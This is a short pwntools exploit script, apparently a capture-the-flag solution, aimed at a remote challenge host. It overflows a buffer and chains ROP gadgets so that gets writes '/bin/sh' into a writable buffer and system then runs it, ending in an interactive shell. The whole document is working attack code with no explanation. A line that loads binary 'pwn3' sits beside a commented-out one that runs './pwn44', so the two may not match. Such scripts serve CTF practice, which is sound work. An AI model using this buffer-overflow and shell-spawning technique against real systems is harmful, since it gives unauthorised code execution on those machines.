from pwn import *
context(arch = 'amd64',os = 'linux',log_level = 'debug')
io =remote("pwn.challenge.ctf.show",28242)
#io = process("./pwn44")
elf =ELF("pwn3")
system = elf.symbols["system"]
gets = elf.symbols["gets"]
pop_rdi=0x4007f3
buf2=0x602080
payload = cyclic(0xA+8)+p64(pop_rdi)+p64(buf2)+p64(gets)+p64(pop_rdi)+p64(buf2)+p64(system)
io.sendline(payload)
io.sendline("/bin/sh")
io.interactive()
